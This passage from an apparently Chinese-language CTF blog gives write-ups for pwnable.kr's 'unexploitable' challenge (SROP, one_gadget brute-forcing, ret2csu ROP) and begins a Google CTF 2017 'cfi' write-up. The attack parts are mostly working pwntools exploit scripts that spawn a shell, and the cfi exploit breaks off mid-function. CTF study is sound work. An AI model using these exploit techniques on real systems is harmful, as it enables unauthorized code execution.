<span class="number">0x601028</span></span><br><span class="line">bss_bin_sh = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">pop_rbp = <span class="number">0x400540</span></span><br><span class="line">leave_addr = <span class="number">0x400576</span></span><br><span class="line"></span><br><span class="line">csu_1 = <span class="number">0x4005e6</span></span><br><span class="line">csu_2 = <span class="number">0x4005d0</span></span><br><span class="line">syscall = <span class="number">0x400560</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造sigreturn frame</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame.rdi = bss_bin_sh     <span class="comment"># /bin/sh</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_read</span>(<span class="params">zero,addr,num,retn,addr1,addr2</span>):</span></span><br><span class="line">    payload  = <span class="number">24</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += p64(csu_1)  <span class="comment"># retn</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0x8  rbx 这样设置可以过cmp rbx,rbp</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)      <span class="comment"># rsp+0x10 rbp 这样设置可以过cmp rbx,rbp</span></span><br><span class="line">    payload += p64(read)   <span class="comment"># rsp+0x18 r12 call</span></span><br><span class="line">    payload += p64(zero)   <span class="comment"># rsp+0x20 r13 -&gt; edi 第一个参数</span></span><br><span class="line">    payload += p64(addr)   <span class="comment"># rsp+0x28 r14 -&gt; rsi 第二个参数</span></span><br><span class="line">    payload += p64(num)    <span class="comment"># rsp+0x30 r15 -&gt; rdx 第三个参数</span></span><br><span class="line">    payload += p64(csu_2)  <span class="comment"># retn</span></span><br><span class="line">    payload += <span class="number">56</span>*<span class="string">&#x27;a&#x27;</span>      <span class="comment"># 56 = 0x38</span></span><br><span class="line">    payload += p64(retn)   <span class="comment"># retn</span></span><br><span class="line">    payload += p64(addr1)</span><br><span class="line">    payload += p64(addr2)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">csu_read(<span class="number">0</span>,bss_frame,<span class="number">0x500</span>,main,<span class="number">0</span>,<span class="number">0</span>)    </span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(syscall) + <span class="built_in">str</span>(frame)    <span class="comment">#bytes(frame)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">csu_read(<span class="number">0</span>,bss_bin_sh,<span class="number">15</span>,pop_rbp,bss_frame,leave_addr)</span><br><span class="line">io.send(<span class="string">&quot;/bin/sh&quot;</span>.ljust(<span class="number">15</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title=" 暴力破解 "></a><center><font color="green"> 暴力破解 </font></center></h2><p>参考链接：<a href="https://www.cnblogs.com/luoleqi/p/13579478.html">vsyscall bypass pie - PwnKi - 博客园 (cnblogs.com)</a></p><p>参考链接：<a href="https://blingblingxuanxuan.github.io/2022/11/06/unexploitable-pwn/#%E6%96%B9%E6%B3%953-SROP-1">pwn题练习之unexploitable | blingbling’s blog (blingblingxuanxuan.github.io)</a></p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title=" 解题思路 "></a><center><font color="orange"> 解题思路 </font></center></h3><p>1、爆破的话一定要知道libc中execve(“/bin/sh”,,)的地址，这就需要本题所依赖的libc库 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#远程查看题目依赖的libc库</span></span><br><span class="line">  $ ldd unexploitable    <span class="comment">#得知目录/lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="comment">#进入远程服务器/lib/x86_64-linux-gnu/目录下发现libc.so.6是libc-2.23.so的软链接</span></span><br><span class="line"><span class="comment">#我们要下载的是libc而不是软链接，所以scp libc-2.23.so到本地</span></span><br><span class="line">  $ scp -P 2222 unexploitable@pwnable.kr:/lib/x86_64-linux-gnu/libc-2.23.so ./</span><br></pre></td></tr></table></figure><p>2、查找execve(“/bin/sh”,,)地址，这里我们选择第四个0xf1247，因为只需要覆盖低三字节即可，所以我们只需要把后面的247覆盖好就行，其他的随机爆破即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget libc-2.23.so </span><br><span class="line">0x45226 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>3、找到栈上指向 libc 的地址</p><p>4、利用 vsyscall 作为 ret 跳板将 ret 指向 1 找到的地址</p><p>5、爆破低3字节</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于ret时rsp指向的栈顶位置就是libc_start_main地址，因此无需使用vsyscall，直接覆盖返回地址的低3个字节为我们gadget的地址就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;unexploitable&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        myio = s.run(<span class="string">&#x27;./unexploitable&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span>*<span class="number">24</span> + <span class="string">b&quot;\x47\xc2\xc9&quot;</span>   <span class="comment"># 0xc9c247  后三位为247即可</span></span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        myio.send(payload)</span><br><span class="line">        sleep(<span class="number">0.03</span>)</span><br><span class="line">        myio.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.03</span>)</span><br><span class="line">        myio.recv()</span><br><span class="line">        myio.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.03</span>)</span><br><span class="line">        myio.recv()</span><br><span class="line">        myio.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        myio.close()</span><br></pre></td></tr></table></figure><p>注：该题设置了sleep(3)，不利于爆破</p><h2 id="ROP"><a href="#ROP" class="headerlink" title=" ROP "></a><center><font color="green"> ROP </font></center></h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title=" 解题思路 "></a><center><font color="orange"> 解题思路 </font></center></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、利用 __libc_csu_init（ret2csu） 实现多次执行 main()、read()</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、将”/bin/sh”写入0x601028地址处，将p64(0x400560)即syscall指令地址写入0x601030(bss段)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、利用 __libc_csu_init 重调read()读入59个字符(这样可以将rax的值赋为59)，接着立即重调 csu 构造 execve(“/bin/sh”,0,0); 并跳转至 syscall 执行系统调用号为59的 execve() 调用。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4、解释：main函数中有一次read()，csu中又有一次read()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">第一步 </span><br><span class="line">    利用main函数中的read()实现调用csu，</span><br><span class="line"></span><br><span class="line">第二步</span><br><span class="line">    利用csu构造read()函数向bss段读入&quot;/bin/sh&quot;及syscall并重新跳转至main函数。</span><br><span class="line"></span><br><span class="line">第三步</span><br><span class="line">    利用重新跳转至的main函数重新调用csu，</span><br><span class="line"></span><br><span class="line">第四步 </span><br><span class="line">    利用重新调用的csu重新构造read()并调用，读入59个字节数据使rax被赋值为59，</span><br><span class="line">    read()读入多少个字符，read()结束后rax值就为多少，细节原理可能得去读read源代码才知道，甚至读源代码编译过后的汇编代码才知道，这里就只说个结论吧，遇见一个记一个，</span><br><span class="line"></span><br><span class="line">第五步</span><br><span class="line">    则立即跳转至csu利用已被赋值为59的rax以及syscall构造出execve(&quot;/bin/sh&quot;,0,0)获取shell</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#解题环境：ubuntu18.04</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;unexploitable&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">io = sh.run(<span class="string">&#x27;./unexploitable&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read = <span class="number">0x601000</span></span><br><span class="line">main = <span class="number">0x400544</span></span><br><span class="line">bss_frame  = <span class="number">0x601028</span></span><br><span class="line">bss_bin_sh = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">pop_rbp = <span class="number">0x400540</span></span><br><span class="line">leave_addr = <span class="number">0x400576</span></span><br><span class="line"></span><br><span class="line">csu_1 = <span class="number">0x4005e6</span></span><br><span class="line">csu_2 = <span class="number">0x4005d0</span></span><br><span class="line">syscall = <span class="number">0x400560</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造sigreturn frame</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame.rdi = bss_bin_sh     <span class="comment"># /bin/sh</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_read</span>(<span class="params">zero,addr,num,retn</span>):</span></span><br><span class="line">    payload  = <span class="number">24</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += p64(csu_1)  <span class="comment"># retn</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0x8  rbx 这样设置可以过cmp rbx,rbp</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)      <span class="comment"># rsp+0x10 rbp 这样设置可以过cmp rbx,rbp</span></span><br><span class="line">    payload += p64(read)   <span class="comment"># rsp+0x18 r12 call</span></span><br><span class="line">    payload += p64(zero)   <span class="comment"># rsp+0x20 r13 -&gt; edi 第一个参数</span></span><br><span class="line">    payload += p64(addr)   <span class="comment"># rsp+0x28 r14 -&gt; rsi 第二个参数</span></span><br><span class="line">    payload += p64(num)    <span class="comment"># rsp+0x30 r15 -&gt; rdx 第三个参数</span></span><br><span class="line">    payload += p64(csu_2)  <span class="comment"># retn</span></span><br><span class="line">    payload += <span class="number">56</span>*<span class="string">&#x27;a&#x27;</span>      <span class="comment"># 56 = 0x38</span></span><br><span class="line">    payload += p64(retn)   <span class="comment"># retn</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_execve</span>(<span class="params">zero,addr,num,retn</span>):</span></span><br><span class="line">    payload  = <span class="number">24</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += p64(csu_1)  <span class="comment"># retn</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0x8  rbx 这样设置可以过cmp rbx,rbp</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)      <span class="comment"># rsp+0x10 rbp 这样设置可以过cmp rbx,rbp</span></span><br><span class="line">    payload += p64(read)   <span class="comment"># rsp+0x18 r12 call</span></span><br><span class="line">    payload += p64(zero)   <span class="comment"># rsp+0x20 r13 -&gt; edi 第一个参数</span></span><br><span class="line">    payload += p64(addr)   <span class="comment"># rsp+0x28 r14 -&gt; rsi 第二个参数</span></span><br><span class="line">    payload += p64(num)    <span class="comment"># rsp+0x30 r15 -&gt; rdx 第三个参数</span></span><br><span class="line">    payload += p64(csu_2)  <span class="comment"># retn</span></span><br><span class="line">    </span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0x8  rbx 这样设置可以过cmp rbx,rbp</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)      <span class="comment"># rsp+0x10 rbp 这样设置可以过cmp rbx,rbp</span></span><br><span class="line">    payload += p64(syscall_bss) <span class="comment"># rsp+0x18 r12 call</span></span><br><span class="line">    payload += p64(bin_sh_bss)  <span class="comment"># rsp+0x20 r13 -&gt; edi 第一个参数</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0x28 r14 -&gt; rsi 第二个参数</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)      <span class="comment"># rsp+0x30 r15 -&gt; rdx 第三个参数</span></span><br><span class="line">    </span><br><span class="line">    payload += p64(retn)   <span class="comment"># retn</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">payload = csu_read(<span class="number">0</span>,bss_frame,<span class="number">0x500</span>,main)  </span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x400560</span>))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_bss = <span class="number">0x601028</span></span><br><span class="line">syscall_bss = <span class="number">0x601030</span></span><br><span class="line"></span><br><span class="line">payload = csu_execve(<span class="number">0</span>,<span class="number">0x601100</span>,<span class="number">59</span>,csu_2)</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;e&quot;</span>*<span class="number">58</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br/><br/><h1 id="2017"><a href="#2017" class="headerlink" title=" 2017 "></a><center><font color="red"> 2017 </font></center></h1>]]></content>
    
    
    <summary type="html">pwnable.kr</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>step2</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/10/25/step2/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/10/25/step2/</id>
    <published>2022-10-25T10:57:58.000Z</published>
    <updated>2022-11-07T11:25:58.836Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span> 2017 <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">二级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;green&quot;</span>&gt;</span> quals <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">三级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;orange&quot;</span>&gt;</span> cfi <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br></pre></td></tr></table></figure><p><strong>题目来源：</strong><a href="https://github.com/google/google-ctf">GitHub - google/google-ctf: Google CTF</a></p><br/><h1 id="2017"><a href="#2017" class="headerlink" title=" 2017 "></a><center><font color="red"> 2017 </font></center></h1><h2 id="quals"><a href="#quals" class="headerlink" title=" quals "></a><center><font color="green"> quals </font></center></h2><h3 id="cfi"><a href="#cfi" class="headerlink" title=" cfi "></a><center><font color="orange"> cfi </font></center></h3><h4 id="源C代码"><a href="#源C代码" class="headerlink" title="源C代码"></a>源C代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;/bin/echo &#x27;addr?&#x27;&quot;</span>);</span><br><span class="line">  read(STDIN_FILENO, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="keyword">char</span> *addr = (<span class="keyword">char</span>*) strtoull(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;/bin/echo &#x27;len?&#x27;&quot;</span>);</span><br><span class="line">  read(STDIN_FILENO, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="keyword">size_t</span> len = strtoull(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;/bin/echo &#x27;data?&#x27;&quot;</span>);</span><br><span class="line">  read(STDIN_FILENO, addr, len);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源码分析</span></span><br><span class="line"><span class="comment">//STDIN_FILENO ：https://blog.csdn.net/sinat_25457161/article/details/48548231</span></span><br><span class="line">read(STDIN_FILENO, buf_read, <span class="keyword">sizeof</span>(buf_read));  <span class="comment">//读取用户的键盘输入信息</span></span><br></pre></td></tr></table></figure><p><strong>源码分析：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、read()函数第一个参数STDIN_FILENO表示从键盘读入数据</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/sinat_25457161/article/details/48548231">Linux中的STDIN_FILENO和STDOUT_FILENO_沫俱宏的博客-CSDN博客_stdout_fileno</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、strtoull()函数：以第3个参数为基准读取第1个参数中的有效字符，并将第一个出现的无效字符</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;地址存入第2个参数，并返回一个无符号long long 整数</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.cnblogs.com/the-tops/p/5886173.html">strtoull函数的使用，及相关信息汇总 - the_tops - 博客园 (cnblogs.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.runoob.com/cprogramming/c-function-strtoul.html">C 库函数 – strtoul() | 菜鸟教程 (runoob.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、弄明白以上两个点后，结合打印字符中的addr、len、data可知，我们可以向程序中任意的一个</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;地址写入我们想要写入的值，也就是拥有任意地址写能力</p><h4 id="对题目所给exp的分析"><a href="#对题目所给exp的分析" class="headerlink" title="对题目所给exp的分析"></a>对题目所给exp的分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">STACK = <span class="number">0xfffff000</span></span><br><span class="line">LIBC = <span class="number">0xff544000</span></span><br><span class="line">CLOSE_IN_CHILD = LIBC + <span class="number">0x57418</span></span><br><span class="line">EXECVE = LIBC + <span class="number">0x56cc0</span></span><br><span class="line">BINSH = LIBC + <span class="number">0xb542c</span></span><br><span class="line">DASH_C = LIBC + <span class="number">0xb5434</span></span><br><span class="line">STACK_FRAME_SIZE = <span class="number">0x138</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>():</span></span><br><span class="line">  HOST = <span class="string">&#x27;104.155.4.100&#x27;</span></span><br><span class="line">  PORT = <span class="number">1337</span></span><br><span class="line">  r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span>(<span class="params">addr, data</span>):</span></span><br><span class="line">  r.readuntil(<span class="string">&#x27;addr?&#x27;</span>)</span><br><span class="line">  r.sendline(<span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"></span><br><span class="line">  r.readuntil(<span class="string">&#x27;len?&#x27;</span>)</span><br><span class="line">  r.sendline(<span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br><span class="line"></span><br><span class="line">  r.readuntil(<span class="string">&#x27;data?&#x27;</span>)</span><br><span class="line">  